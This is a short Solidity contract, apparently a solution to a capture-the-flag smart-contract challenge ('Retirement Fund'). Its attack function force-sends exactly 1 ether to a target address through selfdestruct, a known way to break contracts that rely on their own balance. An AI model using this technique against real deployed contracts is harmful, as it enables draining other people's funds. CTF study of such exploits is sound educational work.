pragma solidity ^0.4.21;

contract CTFRetirementFundChallenge {
    address private owner;
    function CTFRetirementFundChallenge () {
        owner = msg.sender;
    }

    // 强制发送以太币给 _address
    function attack(address _address) public payable{
        require(msg.value == 1 ether);
        selfdestruct(_address);
    }

    function withdraw() public {
        require(msg.sender == owner);

        owner.transfer(address(this).balance);
    }
}
